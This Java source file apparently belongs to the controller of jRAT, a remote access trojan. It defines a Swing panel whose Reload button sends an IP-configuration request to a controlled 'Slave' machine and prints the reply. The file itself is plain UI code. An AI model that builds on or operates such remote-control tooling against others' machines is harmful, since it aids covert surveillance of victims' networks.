package io.jrat.controller.ui.panels;

import iconlib.IconUtils;
import io.jrat.controller.Slave;
import io.jrat.controller.packets.outgoing.Packet72IPConfig;

import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JScrollPane;
import javax.swing.JTextPane;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;


@SuppressWarnings("serial")
public class PanelControlNetGateway extends PanelControlParent {

	private JTextPane textPane;

	public JTextPane getPane() {
		return textPane;
	}

	public PanelControlNetGateway(Slave sl) {
		super(sl);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnReload = new JButton("Reload");
		btnReload.setIcon(IconUtils.getIcon("update"));
		btnReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				textPane.setText("");
				slave.addToSendQueue(new Packet72IPConfig());
			}
		});

		JButton btnClear = new JButton("Clear");
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				textPane.setText("");
			}
		});
		btnClear.setIcon(IconUtils.getIcon("clear"));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 599, GroupLayout.PREFERRED_SIZE).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(btnReload).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnClear))).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 310, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(btnReload).addComponent(btnClear)).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));

		textPane = new JTextPane();
		textPane.setForeground(Color.WHITE);
		textPane.setBackground(Color.BLACK);
		textPane.setEditable(false);
		scrollPane.setViewportView(textPane);
		setLayout(groupLayout);
	}
}
